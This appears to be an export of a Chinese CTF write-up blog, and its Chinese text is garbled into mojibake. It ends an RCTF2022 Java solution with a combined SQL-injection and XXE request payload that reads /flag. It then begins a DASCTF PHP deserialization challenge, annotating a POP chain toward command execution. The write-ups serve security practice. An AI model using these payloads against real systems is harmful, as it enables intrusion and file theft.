class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure><p>å…ˆåˆ†æä¸€ä¸‹</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure><p><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class ç±»</strong></a>çš„**forName()**æ–¹æ³•ç”¨äºè·å–å…·æœ‰æŒ‡å®šç±»åçš„è¯¥ç±»çš„å®ä¾‹ã€‚æ­¤ç±»åç§°æŒ‡å®šä¸ºå­—ç¬¦ä¸²å‚æ•°</p><p>ç®€è€Œè¨€ä¹‹ï¼Œ<strong>Class.forName</strong> æ–¹æ³•çš„ä½œç”¨ï¼Œå°±æ˜¯åˆå§‹åŒ–ç»™å®šçš„ç±»ã€‚</p></blockquote><h4 id="classes-0-amp-classes-1"><a href="#classes-0-amp-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨äº†åå°„æœºåˆ¶ã€‚å®ƒé¦–å…ˆä½¿ç”¨ <code>Class.forName(classes[0])</code> æ–¹æ³•æ¥è·å–ç±»çš„ <code>Class</code> å¯¹è±¡ã€‚</p><p>ç„¶åä½¿ç”¨ <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> æ–¹æ³•æ¥è·å–è¯¥ç±»çš„æ„é€ å‡½æ•°ã€‚</p><p>è¯¥æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ª <code>Class</code> æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œè¯¥æ„é€ å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä¸”å…¶å‚æ•°çš„ç±»å‹æ˜¯ <code>classes[1]</code> ä¸­æ‰€è¡¨ç¤ºçš„ç±»ã€‚æœ€åå°†è·å–åˆ°çš„æ„é€ å‡½æ•°èµ‹å€¼ç»™ <code>constructor</code> å˜é‡ã€‚</p><blockquote><p>åå°„æœºåˆ¶æ˜¯ Java ç¼–ç¨‹è¯­è¨€ä¸­ä¸€ç§ç”¨äºè·å–ç±»ã€æ¥å£ã€æ„é€ æ–¹æ³•ã€å­—æ®µã€æ–¹æ³•ç­‰ä¿¡æ¯çš„æœºåˆ¶ã€‚åå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–ã€ä½¿ç”¨ã€æ“ä½œç±»çš„ç›¸å…³ä¿¡æ¯ã€‚</p></blockquote></blockquote><p><strong>&#x3D;&#x3D;&gt;</strong></p><blockquote><p><code>classes[0]</code>ï¼š</p><p>è¿™ä¸ªæ˜¯çœ‹å…¶ä»–å¤§ä½¬wpæ¸…æ¥šäº†ï¼Œè¿™é‡Œèµ‹å€¼å­—èŠ‚æ•°ç»„ <code>java.io.ByteArrayInputStream</code>,ç„¶å<code>bytepoc</code>é€šè¿‡<strong>ByteArrayInputStreamè½¬æ¢ä¸ºè¾“å…¥æµ</strong>ï¼Œå› ä¸ºå…¶ç±»ä¸­æœ‰<code>read()</code>å¯ä»¥è¯»å–æ•°æ®</p><p><code>classes[1]</code>ï¼š</p><p>æ˜¯æ•°ç»„å‚æ•°æ•°æ®ç±»å‹ï¼Œæ ¹æ®æ•°ç»„å‚æ•°ç±»å‹â€<code>[B</code>â€œ æ˜¯è¡¨ç¤ºå­—èŠ‚æ•°ç»„ (byte array) çš„ç±»å‹åç§°ã€‚</p><blockquote><p>åœ¨ java ä¸­ï¼Œæ•°ç»„ç±»å‹çš„ç±»å‹åç§°ä¼šåœ¨å‰é¢åŠ ä¸Š â€œ[â€œ ç¬¦å·è¡¨ç¤ºï¼Œæ¯”å¦‚<code>[I</code>ä»£è¡¨ int ç±»å‹çš„æ•°ç»„ç±»å‹åç§°ï¼Œä½†æ˜¯ç”±äºstringä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåªèƒ½ç”¨ç±»è¡¨ç¤º<code>[Ljava.lang.String;</code></p></blockquote></blockquote><p><strong>æ‰€ä»¥</strong></p><blockquote><p><code>classes[0]=java.io.ByteArrayInputStream</code></p><p><code>classes[1]=[B</code>   (å› ä¸º<code>bytepoc</code>ä¸º<code>byte</code>æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥<code>ByteArrayInputStream</code>ç±»ä¸­çš„æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ä¹Ÿå£°æ˜ä¸º<code>byte</code></p></blockquote><h4 id="classes-2-amp-classes-3"><a href="#classes-2-amp-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">   <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>inputSource</code>å‚æ•°æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç é¦–å…ˆä½¿ç”¨ <code>Class.forName(classes[2])</code> æ–¹æ³•æ¥è·å–ç¬¬ä¸‰ä¸ªå‚æ•°æ‰€è¡¨ç¤ºçš„ç±»çš„ <code>Class</code> å¯¹è±¡ï¼Œåœ¨è¿™é‡Œæ˜¯ <code>org.xml.sax.InputSource</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯ <code>SAX (Simple API for XML)</code> ä¸­ç”¨äºè¯»å– <code>XML</code> æ–‡æ¡£çš„ä¸€ä¸ªç±»ã€‚</p><p>ç„¶åä½¿ç”¨ <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> æ–¹æ³•æ¥è·å–è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨è¿™é‡Œæ˜¯ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªå‚æ•°æ˜¯ <code>classes[3]</code> æ‰€è¡¨ç¤ºçš„ç±»ã€‚</p><p>ä¹‹åä½¿ç”¨ <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ª <code>org.xml.sax.InputSource</code> ç±»å‹çš„å®ä¾‹ï¼Œä½¿ç”¨å‚æ•°å€¼ä¸º <code>wrappoc</code> çš„æ„é€ å‡½æ•°æ¥åˆ›å»ºè¿™ä¸ªå®ä¾‹ã€‚</p><p>æ¥ç€ä½¿ç”¨ <code>builder.parse(inputSource)</code> æ–¹æ³•æ¥è§£æ <code>inputSource</code> å¯¹è±¡ï¼Œè¿™é‡Œçš„ <code>builder</code> æ˜¯ <code>DocumentBuilder</code> ç±»å‹çš„å¯¹è±¡ï¼Œ<code>DocumentBuilder</code> æ˜¯ <code>javax.xml.parsers</code> åŒ…ä¸­æä¾›çš„ä¸€ä¸ªç±»ï¼Œå…¶ä½œç”¨æ˜¯åˆ›å»º <strong>DOM è§£æå™¨</strong>ï¼Œç”¨äº<code>è§£æ XML æ–‡æ¡£</code></p><p>&#x3D;&#x3D;&gt;</p><p><code>inputSource</code>å€¼ä¸ºæ¶æ„xmlæ–‡ä»¶å†…å®¹</p><p><code>doc</code>å€¼ä¸ºè§£ææ¶æ„xmlæ–‡ä»¶åå¾—åˆ°çš„å†…å®¹</p></blockquote><p>åœ¨ä»£ç è¿˜æœ‰ä¸€æ®µå®ç°æ‰“å°çš„ä»£ç ï¼Œè¿™æ®µä»£ç å°±å®Œæˆäº†æŠŠ<code>doc</code>ä¸­è§£ææ¶æ„xmlæ–‡æ¡£åå¾—åˆ°çš„å†…å®¹ï¼Œæ‰“å°è¾“å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ®µä»£ç é¦–å…ˆä½¿ç”¨ <code>doc.getChildNodes()</code> æ–¹æ³•è·å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨ <code>NodeList</code> å¯¹è±¡ä¸­ã€‚</p><p>ç„¶åä½¿ç”¨ä¸€ä¸ª <code>for</code> å¾ªç¯æ¥éå† <code>NodeList</code> ä¸­çš„æ¯ä¸ªå­èŠ‚ç‚¹ã€‚åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œä½¿ç”¨ <code>nodes.item(i)</code> æ–¹æ³•è·å–å½“å‰éå†åˆ°çš„å­èŠ‚ç‚¹ã€‚</p><p>ä¹‹åä½¿ç”¨ <code>if</code> è¯­å¥æ¥æ£€æŸ¥å½“å‰å­èŠ‚ç‚¹çš„ç±»å‹ã€‚å¦‚æœè¯¥ç±»å‹ä¸º<code>1</code> (å³å…ƒç´ èŠ‚ç‚¹)ï¼Œåˆ™ä½¿ç”¨ <code>nodes.item(i).getTextContent()</code> æ–¹æ³•è·å–è¯¥å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹å¹¶å°†å…¶åŠ åˆ° <code>res</code> å˜é‡ä¸­ã€‚ç„¶åä½¿ç”¨ <code>System.out.println(nodes.item(i).getTextContent())</code> æ–¹æ³•å°†è¯¥æ–‡æœ¬å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ã€‚</p><p><strong>æ€»çš„æ¥è¯´</strong>ï¼Œè¿™æ®µä»£ç ç”¨äºéå†æ–‡æ¡£ä¸­æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œå¹¶å°†æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹æå–å‡ºæ¥å¹¶å­˜å‚¨åœ¨ res å˜é‡ä¸­ï¼ŒåŒæ—¶å°†å…¶æ‰“å°åˆ°æ§åˆ¶å°ã€‚</p><p>è¿™æ®µä»£ç é€šè¿‡éå†<code>doc</code>ä¸­çš„æ‰€æœ‰å­èŠ‚ç‚¹,å¹¶å°†æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹è·å–å‡ºæ¥å¹¶å­˜å‚¨åœ¨<code>res</code>å˜é‡ä¸­,åŒæ—¶å°†å…¶æ‰“å°åˆ°æ§åˆ¶å°(è¿™æ®µä»£ç åœ¨çˆ¬è™«é¢†åŸŸå¾ˆå¸¸ç”¨æ¥æå–ç½‘é¡µä¸­çš„æ–‡æœ¬å†…å®¹)</p></blockquote><p><strong>æ‰€ä»¥</strong></p><blockquote><p><code>classes[2]=org.xml.sax.InputSource</code></p><p>&#x2F;&#x2F;è¿™é‡Œä¸º<code>org.xml.sax.InputSource</code>ç±»ï¼Œç”¨äºè¯»å–xmlæ–‡ä»¶ï¼Œå°†å…¶è½¬åŒ–ä¸ºå¯è§£æçš„xmlæ ¼å¼ï¼Œä¾¿äºåé¢è¿›è¡Œ</p><p><code>classes[3]=java.io.InputStream</code>     </p><p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>æ˜¯<code>java.io.InputStream</code>çš„å­ç±»ï¼Œä½†æ˜¯<code>java.io.ByteArrayInputStream</code>ä¸èƒ½ç›´æ¥ä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°ä¼ å…¥ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°,å› ä¸º<code>org.xml.sax.InputSource</code>å’Œ <code>java.io.InputStream</code> ä¹‹é—´å¹¶æ²¡æœ‰ç»§æ‰¿å…³ç³»ã€‚</p><p>&#x2F;&#x2F;å¦‚æœ<code>classes[3]=java.io.ByteArrayInputStream</code>ï¼Œä¼šå¯¼è‡´ç¨‹åºåœ¨æ‰§è¡Œ <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> æ–¹æ³•æ—¶å‡ºç°å¼‚å¸¸,å› ä¸ºç±»å‹ä¸åŒ¹é…ï¼Œ</p><p>é™¤é<code>ByteArrayInputStream</code>è½¬æ¢ä¸º<code>InputStream</code> ç±»å‹çš„å¯¹è±¡æ‰èƒ½ä¼ å…¥ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p></blockquote><p><img src="/2023/02/13/RCTF2022-wp/image-20230125004553248.png" alt="image-20230125004553248"></p><h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›</title>
      <link href="/2023/02/13/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/"/>
      <url>/2023/02/13/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›"><a href="#DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›" class="headerlink" title="DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›"></a>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›</h1><h2 id="1-EasyPOP"><a href="#1-EasyPOP" class="headerlink" title="1.EasyPOP"></a>1.EasyPOP</h2><p>ä¸€é“æ„é€ <code>pop</code>é“¾çš„é¢˜ï¼Œæ‹¿æ¥ç»ƒä¹ ä¸€ä¸‹åˆ†æèƒ½åŠ›</p><p>åšååºåˆ—æ„é€ <code>pop</code>é“¾æœ€é‡è¦è¿˜æ˜¯è¦ä¼šè”æƒ³ï¼Œä»è€Œè§¦å‘æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"> <span class="comment">//showç±»æœ‰this-&gt;ctf-&gt;show() è”æƒ³ä¸€ä¸‹__callå‡½æ•°ï¼Œæˆ–è€…çœ‹çœ‹å…¶ä»–ç±»æœ‰showå‡½æ•°æ²¡ï¼Œåœ¨secret_codeç±»ä¸­å‘ç°æœ‰showå‡½æ•°ï¼Œè€Œå…¶å‡½æ•°å†…è¯­å¥ä¼šè§¦å‘__geté­”æœ¯ï¼Œè€Œ__geté­”æœ¯ä¼šè§¦å‘fineç±»çš„__invokeé­”æœ¯ï¼Œå…¶ä¸­çš„call_user_funcå°±æ˜¯å®ç°ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œçš„å…³é”®ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸è§¦å‘__callé­”æœ¯</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line"><span class="comment">//sorryç±»çš„__getå‡½æ•°æœ‰$name()ï¼Œè”æƒ³åˆ°__invokeï¼Œfineç±»çš„__invoke å‡½æ•°æœ‰call_user_funcå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯çªç ´å£</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„passwordå’Œnameå°±éœ€è¦å¤–éƒ¨å®ä¾‹åŒ–åèµ‹å€¼ä¸ºç›¸åŒçš„ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½é€šè¿‡ä¸‹é¢è¯­å¥è°ƒç”¨é­”æœ¯æ–¹æ³•ï¼Œè€Œä¸æ‰§è¡Œelseè¯­å¥</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        <span class="comment">//sorryçš„ææ„å‡½æ•°æœ‰echo $this-&gt;hint è”æƒ³ä¸€ä¸‹__toStringå‡½æ•°ï¼Œåœ¨Showç±»ä¸­</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 